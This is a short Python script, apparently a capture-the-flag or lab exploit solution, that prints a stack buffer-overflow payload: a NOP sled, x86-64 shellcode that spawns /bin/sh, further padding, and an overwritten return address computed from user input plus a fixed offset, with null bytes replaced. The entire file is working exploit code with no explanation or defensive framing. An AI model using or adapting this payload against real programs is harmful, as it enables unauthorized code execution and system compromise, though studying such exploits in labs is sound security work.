offset = 176

def main():
    ra = input()
    ra = getReturnAddress(ra)
    print(ra)
    shellcode = "\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05"
    payload = "\\x90"*323
    payload += shellcode
    payload += "\\x90"*1000
    payload += ra + "\\n"
    print(payload)

def getReturnAddress(ra):
    bytera = stringToByteLittleEndian(ra)
    return bytera

def stringToByteLittleEndian(val):
    val = str(hex(int(val, 16) + offset ))[2:]
    result = ""
    for i in range(0, len(val), 2):
        if(val[i:i+2] == "00"):
            result = "\\x" + "01" + result
        else:
            result = "\\x" + val[i:i+2] + result
    return result

if __name__ == "__main__":
    main()